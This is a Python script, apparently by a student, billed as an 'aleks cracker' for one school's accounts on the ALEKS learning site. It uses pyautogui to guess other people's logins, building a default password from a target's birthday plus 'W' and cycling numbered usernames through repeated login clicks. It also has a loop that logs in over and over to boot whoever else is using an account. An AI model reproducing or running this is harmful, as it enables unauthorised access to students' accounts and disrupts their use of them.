import time
import os
import pyautogui
from pynput import keyboard
import random
from colorama import Fore

# this is for filtering dates
def date(string):
    return string.replace(",", "")




#pyautogui.moveTo(100,100,duration=0.5)

# this is a bad script wich has more printing than script

#  my bad ui
print("---------------------------------------------------")
print("aleks cracker for woodland mid 2021-2022 by RafiDEV")
print("---------------------------------------------------")
print("-------------------")
print("0 | exit")
print("--|----------------")
print("1 | simple")
print("--|----------------")
print("2 | randomized (not working for now)")
print("--|----------------")
print("3 | boot dude our of there acc")
print("-------------------")
guy = input(": ")

#this cheks what the thing is u put is in the menue


# boot of line
if guy == "3":


    uname = input("type your aleks user name: ")
    pw = input("type your aleks password: ")

    input("move your mouse over the password text thing in aleks")
    print("u got 5 sec to do so")

    time.sleep(5)
    pb = pyautogui.position()

    input("move your mouse over the username text thing in aleks")
    print("u got 5 sec to do so")

    time.sleep(5)
    ub = pyautogui.position()





    #the spam thing were it will open login and quit
    while True:
        pyautogui.hotkey('ctrl', 't')
        pyautogui.write('https://www.aleks.com/login')
        pyautogui.press('enter')
        time.sleep(1)
        
        pyautogui.moveTo(pb)
        pyautogui.click()
        pyautogui.write(pw)

        pyautogui.moveTo(ub)
        pyautogui.click()
        pyautogui.write(uname)

        pyautogui.press('enter')
        time.sleep(10)

        pyautogui.press('tab')
        pyautogui.press('tab')
        pyautogui.press('enter')
        pyautogui.press('down')
        pyautogui.press('enter')
        time.sleep(5)
        pyautogui.hotkey('ctrl', 'w')




if guy == "hecker":
    while True:

        a = random.randint(0,130)
        b = random.randint(0,104)
        d = random.randint(0,1900)

        print(Fore.GREEN + str(d) + "  " + str(a) + "  " + str(b) + "  " + str(a) + "  " + str(b) + "  " + str(a))
        #time.sleep(0.001)

if guy == "2":
    def spam():
        pyautogui.moveTo(ppw)
        pyautogui.click()

        # the date(str) is the thing for filtering the carictors in this case comas
        pyautogui.write(date(pw))

        pyautogui.moveTo(user)
        pyautogui.click()
        pyautogui.write(Uname + str(n))

        pyautogui.moveTo(login)
        pyautogui.click()
        time.sleep(0.2)
        pyautogui.click()

        time.sleep(2)




    print("type the first name or first initial")
    name1 = input(": ")
    print("type the persons last name")

    name2 = input(": ")

    print("type the persons birth day: MM,DD,YYYY")
    bday = input(": ")

    print("type a number, numbers smaller then it will be typed")
    num = input(": ")

    # the hard math at work

    Sname1 = name1[:1]
    pw = bday + "W"


    Uname = Sname1 + name2
    Uname = str.upper(Uname)

    # this shows the stuff that will be riten
    print()
    print("the user name might be:")

    print(Uname + "(random number)")

    print()
    print("the pasword is: " + date(pw))

    #   this is for calabrating

    print("move your mouse over the login button in aleks login page")
    input("press enter to continue")
    print("5")
    time.sleep(1)

    print("4")
    time.sleep(1)

    print("3")
    time.sleep(1)

    print("2")
    time.sleep(1)

    print("1")
    time.sleep(1)


    login = pyautogui.position()
    print("your maouse is at: ")
    print(pyautogui.position())


    print("move your mouse over the username text box in aleks login page")
    input("press enter to continue")
    print("5")
    time.sleep(1)

    print("4")
    time.sleep(1)

    print("3")
    time.sleep(1)

    print("2")
    time.sleep(1)

    print("1")
    time.sleep(1)


    user = pyautogui.position()
    print("your maouse is at: ")
    print(pyautogui.position())

    print("move your mouse over the password text box in aleks login page")
    input("press enter to continue")
    print("5")
    time.sleep(1)

    print("4")
    time.sleep(1)

    print("3")
    time.sleep(1)

    print("2")
    time.sleep(1)

    print("1")
    time.sleep(1)


    ppw = pyautogui.position()
    print("your maouse is at: ")
    print(pyautogui.position())

    print("to stop press ^C")

   
    oldNum = []
    while True:

        # more hard math

        n = random.randint(1, int(num))

        if  not set(oldNum) == n:
            
            oldNum.append(n)
            pyautogui.moveTo(ppw)
            pyautogui.click()

            # the date(str) is the thing for filtering the carictors in this case comas
            pyautogui.write(date(pw))

            pyautogui.moveTo(user)
            pyautogui.click()
            pyautogui.write(Uname + str(n))

            pyautogui.moveTo(login)
            pyautogui.click()
            time.sleep(0.2)
            pyautogui.click()

            time.sleep(2)
            print(oldNum)

if guy == "0":
    exit()

if guy == "1":
    print("type the first name or first initial")
    name1 = input(": ")
    print("type the persons last name")

    name2 = input(": ")

    print("type the persons birth day: MM,DD,YYYY")
    bday = input(": ")

    # the had math at work

    Sname1 = name1[:1]
    pw = bday + "W"

    Uname = Sname1 + name2
    Uname = str.upper(Uname)

    # this shows the stuff that will be riten
    print()
    print("the user name might be:")

    print(Uname + "(random number)")

    print()
    print("the pasword is: " + date(pw))

    #   this is for calabrating

    print("move your mouse over the login button in aleks login page")
    input("press enter to continue")
    print("5")
    time.sleep(1)

    print("4")
    time.sleep(1)

    print("3")
    time.sleep(1)

    print("2")
    time.sleep(1)

    print("1")
    time.sleep(1)


    login = pyautogui.position()
    print("your maouse is at: ")
    print(pyautogui.position())


    print("move your mouse over the username text box in aleks login page")
    input("press enter to continue")
    print("5")
    time.sleep(1)

    print("4")
    time.sleep(1)

    print("3")
    time.sleep(1)

    print("2")
    time.sleep(1)

    print("1")
    time.sleep(1)


    user = pyautogui.position()
    print("your maouse is at: ")
    print(pyautogui.position())

    print("move your mouse over the password text box in aleks login page")
    input("press enter to continue")
    print("5")
    time.sleep(1)

    print("4")
    time.sleep(1)

    print("3")
    time.sleep(1)

    print("2")
    time.sleep(1)

    print("1")
    time.sleep(1)


    ppw = pyautogui.position()
    print("your maouse is at: ")
    print(pyautogui.position())

    print("to stop press ^C")

    #the spaming
    n = 0
    while True:
        n = n + 1
        pyautogui.moveTo(ppw)
        pyautogui.click()

        # the date(str) is the thing for filtering the carictors in this case comas
        pyautogui.write(date(pw))

        pyautogui.moveTo(user)
        pyautogui.click()
        pyautogui.write(Uname + str(n))

        pyautogui.moveTo(login)
        pyautogui.click()
        time.sleep(0.2)
        pyautogui.click()

        time.sleep(2)
        #print("you have the script typed " + n + " times              to stop press ^C")   





